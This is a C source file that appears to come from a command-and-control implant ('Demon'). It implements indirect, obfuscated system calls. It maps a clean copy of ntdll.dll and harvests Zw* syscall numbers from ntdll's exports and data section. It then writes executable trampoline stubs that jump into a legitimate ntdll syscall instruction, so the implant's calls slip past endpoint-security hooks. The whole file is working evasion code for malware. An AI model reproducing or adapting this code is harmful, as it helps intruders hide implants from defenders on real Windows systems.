#include <Demon.h>
#include <Core/Syscalls.h>
#include <Core/MiniStd.h>
#include <ntstatus.h>

#ifdef OBF_SYSCALL

// TODO: refactor all this
PVOID SyscallLdrNtdll()
{
    OBJECT_ATTRIBUTES   ObjectAttributes    = { 0 };
    UNICODE_STRING      ObjectPath          = { 0 };
    IO_STATUS_BLOCK     IoStatusBlock       = { 0 };

    HANDLE              hFile               = NULL;
    HANDLE              hSection            = NULL;
    LPVOID              pSection            = NULL;
    SIZE_T              ViewSize            = 0;
    PWCHAR              NtdllPath           = L"\\??\\C:\\Windows\\System32\\ntdll.dll"; // TODO: xor encrypt this
    SIZE_T              Size                = 0;
    CONST SIZE_T        UnicodeMaxSize      = ( USHRT_MAX & ~1 ) - sizeof( UNICODE_NULL );

    Size = StringLengthW( NtdllPath ) * sizeof( WCHAR );

    if ( Size > UnicodeMaxSize )
        Size = UnicodeMaxSize;

    ObjectPath.Length = ObjectPath.MaximumLength = Size;
    ObjectPath.Buffer = NtdllPath;

    InitializeObjectAttributes( &ObjectAttributes, &ObjectPath, OBJ_CASE_INSENSITIVE, 0, NULL );

    if ( NT_SUCCESS( Instance.Syscall.NtOpenFile( &hFile, FILE_READ_DATA, &ObjectAttributes, &IoStatusBlock, FILE_SHARE_READ, 0 ) ) )
    {
        if ( NT_SUCCESS( Instance.Syscall.NtCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_COMMIT, hFile ) ) )
        {
            if ( NT_SUCCESS( Instance.Syscall.NtMapViewOfSection( hSection, NtCurrentProcess(), &pSection, NULL, NULL, NULL, &ViewSize, 1, 0, PAGE_READONLY ) ) )
            {
                PRINTF( "pSection => %p\n", pSection );
                return pSection;
            }
        }
    }

    if ( hSection )
        Instance.Win32.NtClose( hSection );
    if ( hFile )
        Instance.Win32.NtClose( hFile );

    return ( ULONG_PTR ) NULL;
}

ULONG_PTR BuildSyscallStub( ULONG_PTR StubRegion, DWORD dwSyscallNo )
{
    LPVOID  Masquerade     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x180024b6 );
    LPVOID  syscallAddress = Masquerade + 18;
    BYTE    SyscallStub[]  = { 0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00, 0x00, 0x00, };
    UCHAR   jumpPrelude[]  = { 0x00, 0x49, 0xBB };
    UCHAR   jumpAddress[]  = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
    UCHAR   jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };

    *( LPVOID * ) ( jumpAddress ) = syscallAddress;

    MemCopy( ( PBYTE )StubRegion, SyscallStub, sizeof( SyscallStub ) );
    MemCopy( ( PBYTE )StubRegion + 7, jumpPrelude, 3 );
    MemCopy( ( PBYTE )StubRegion + 7 + 3, jumpAddress, sizeof( jumpAddress ) );
    MemCopy( ( PBYTE )StubRegion + 7 + 3 + 8, jumpEpilogue, 4 );

    *( PDWORD )( StubRegion + 4 ) = dwSyscallNo;

    return StubRegion;
}

BOOL SyscallsInit()
{
    PIMAGE_NT_HEADERS     ImageNtHeaders        = NULL;
    PIMAGE_SECTION_HEADER SectionHeader         = NULL;
    DWORD                 SysNtOpenFile         = 0;
    DWORD                 SysNtCreateSection    = 0;
    DWORD                 SysNtMapViewOfSection = 0;
    ULONG_PTR             DataSectionAddress    = NULL;
    DWORD                 DataSectionSize       = 0;
    LPVOID                SyscallRegion         = NULL;
    DWORD                 OldProtection         = 0;

    ImageNtHeaders = RVA( PIMAGE_NT_HEADERS, Instance.Modules.Ntdll, ( ( PIMAGE_DOS_HEADER ) Instance.Modules.Ntdll )->e_lfanew );
    SectionHeader  = C_PTR( &ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++ )
    {
        if ( ! MemCompare( SectionHeader[ i ].Name, ".data", 5 ) )
        {
            DataSectionAddress = Instance.Modules.Ntdll + SectionHeader[ i ].VirtualAddress;
            DataSectionSize    = SectionHeader[ i ].Misc.VirtualSize;
            break;
        }
    }

    if ( ! DataSectionAddress || DataSectionSize < 16 * 5 )
        return FALSE;

    for ( UINT uiOffset = 0; uiOffset < DataSectionSize - (16 * 5); uiOffset++ )
    {
        if ( *( PDWORD ) ( DataSectionAddress + uiOffset )      == 0xb8d18b4c &&
             *( PDWORD ) ( DataSectionAddress + uiOffset + 16 ) == 0xb8d18b4c &&
             *( PDWORD ) ( DataSectionAddress + uiOffset + 32 ) == 0xb8d18b4c &&
             *( PDWORD ) ( DataSectionAddress + uiOffset + 48 ) == 0xb8d18b4c &&
             *( PDWORD ) ( DataSectionAddress + uiOffset + 64 ) == 0xb8d18b4c )
        {
            SysNtOpenFile         = *( PDWORD ) ( DataSectionAddress + uiOffset + 4 );
            SysNtCreateSection    = *( PDWORD ) ( DataSectionAddress + uiOffset + 16 + 4 );
            SysNtMapViewOfSection = *( PDWORD ) ( DataSectionAddress + uiOffset + 64 + 4 );
            break;
        }
    }

    SyscallRegion = ( ULONG_PTR ) Instance.Win32.VirtualAllocEx( NtCurrentProcess(), NULL, 3 * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
    if ( ! SyscallRegion )
        return FALSE;

    Instance.Syscall.NtOpenFile         = BuildSyscallStub( SyscallRegion, SysNtOpenFile );
    Instance.Syscall.NtCreateSection    = BuildSyscallStub( SyscallRegion + MAX_SYSCALL_STUB_SIZE, SysNtCreateSection );
    Instance.Syscall.NtMapViewOfSection = BuildSyscallStub( SyscallRegion + ( 2 * MAX_SYSCALL_STUB_SIZE ), SysNtMapViewOfSection );

    Instance.Win32.VirtualProtectEx( NtCurrentProcess(), SyscallRegion, 3 * MAX_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &OldProtection );

    return TRUE;
}

ULONG_PTR RVAToFileOffsetPointer( ULONG_PTR pModule, DWORD dwRVA )
{
    PIMAGE_NT_HEADERS       ImageNtHeaders  = ( PIMAGE_NT_HEADERS )( pModule + ( ( PIMAGE_DOS_HEADER ) pModule )->e_lfanew );
    PIMAGE_SECTION_HEADER   SectionHeader   = ( PIMAGE_SECTION_HEADER )( ( ULONG_PTR ) &ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++ )
    {
        if ( SectionHeader[i].VirtualAddress <= dwRVA && SectionHeader[ i ].VirtualAddress + SectionHeader[ i ].Misc.VirtualSize > dwRVA )
        {
            dwRVA -= SectionHeader[ i ].VirtualAddress;
            dwRVA += SectionHeader[ i ].PointerToRawData;

            return pModule + dwRVA;
        }
    }

    return NULL;
}

ULONG_PTR FindBytes( ULONG_PTR Source, DWORD SourceLength, ULONG_PTR Search, DWORD SearchLength )
{
    while ( SearchLength <= SourceLength )
    {
        if ( ! MemCompare( Source, Search, SearchLength ) )
            return Source;

        Source++;
        SourceLength--;
    }

    return NULL;
}

UINT SyscallsExtract( ULONG_PTR pNtdll, PSYSCALL_STUB Syscalls )
{
    PUTS( "Start" )

    LPVOID  FakeSyscall     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x180024b6 );
    LPVOID  syscallAddress  = ( PCHAR ) FakeSyscall + 18;
    UCHAR   jumpPrelude[]   = { 0x00, 0x49, 0xBB };
    UCHAR   jumpAddress[]   = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
    UCHAR   jumpEpilogue[]  = { 0x41, 0xFF, 0xE3, 0xC3 };
    UINT    uiCount         = 0;
    CHAR    Name[ PATH_MAX ]= { 0 };
    PVOID   pStubs          = NULL;
    DWORD   OldProtection   = 0;

    *( LPVOID* )( jumpAddress ) = syscallAddress;

    PIMAGE_NT_HEADERS       ImageNtHeaders  = RVA( PIMAGE_NT_HEADERS, pNtdll, ( ( PIMAGE_DOS_HEADER ) pNtdll )->e_lfanew );
    PIMAGE_DATA_DIRECTORY   DataDirectory   = ImageNtHeaders->OptionalHeader.DataDirectory;
    DWORD                   VirtualAddress  = DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = RVAToFileOffsetPointer( pNtdll, VirtualAddress );
    DWORD                   NumberOfNames   = ExportDirectory->NumberOfNames;
    PDWORD                  Functions       = RVAToFileOffsetPointer( pNtdll, ExportDirectory->AddressOfFunctions );
    PDWORD                  Names           = RVAToFileOffsetPointer( pNtdll, ExportDirectory->AddressOfNames );
    PWORD                   Ordinals        = RVAToFileOffsetPointer( pNtdll, ExportDirectory->AddressOfNameOrdinals );

    pStubs = Instance.Win32.VirtualAllocEx( NtCurrentProcess(), NULL, MAX_NUMBER_OF_SYSCALLS * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    if ( ! pStubs )
        return 0;

    for ( DWORD i = 0; i < NumberOfNames && uiCount < MAX_NUMBER_OF_SYSCALLS; i++ )
    {
        PCHAR FunctionName = ( PCHAR ) RVAToFileOffsetPointer( pNtdll, Names[ i ] );

        if ( *( PUSHORT ) FunctionName == 'wZ' )
        {
            ULONG_PTR FunctionPtr = RVAToFileOffsetPointer( pNtdll, Functions[ Ordinals[ i ] ] );
            ULONG_PTR FunctionEnd = FindBytes( FunctionPtr, MAX_SYSCALL_STUB_SIZE, ( ULONG_PTR )"\x0f\x05\xc3", 3 ) + 3;

            if ( FunctionEnd )
            {
                MemCopy( Name, FunctionName, StringLengthA( FunctionName ) );

                *( PWORD ) ( Name ) = 'tN';
                Syscalls[ uiCount ].Hash = HashStringA( Name );

                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ), FunctionPtr, FunctionEnd - FunctionPtr - 13 );
                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ) + 7, jumpPrelude, 3 );
                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ) + 7 + 3, jumpAddress, 8 );
                MemCopy( pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE ) + 7 + 3 + 8, jumpEpilogue, 4 );

                Syscalls[ uiCount ].Stub = pStubs + ( uiCount * MAX_SYSCALL_STUB_SIZE );

                MemSet( Name, 0, MAX_PATH );

                uiCount++;
            }
        }
    }

    // Instance.Win32.VirtualProtectEx( NtCurrentProcess(), pStubs, 3 * MAX_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &OldProtection );

    return uiCount;
}

PVOID SyscallsObf( PSYSCALL_STUB Syscalls, UINT uiCount, DWORD dwSyscallHash )
{
    for ( UINT32 i = 0; i < uiCount; i++ )
    {
        if ( Syscalls[ i ].Hash == dwSyscallHash )
        {
            PRINTF( "Syscall stub => %p\n", Syscalls[ i ].Stub )
            return Syscalls[ i ].Stub;
        }
    }

    PUTS( "Couldn't found syscalls" )
    return NULL;
}

#endif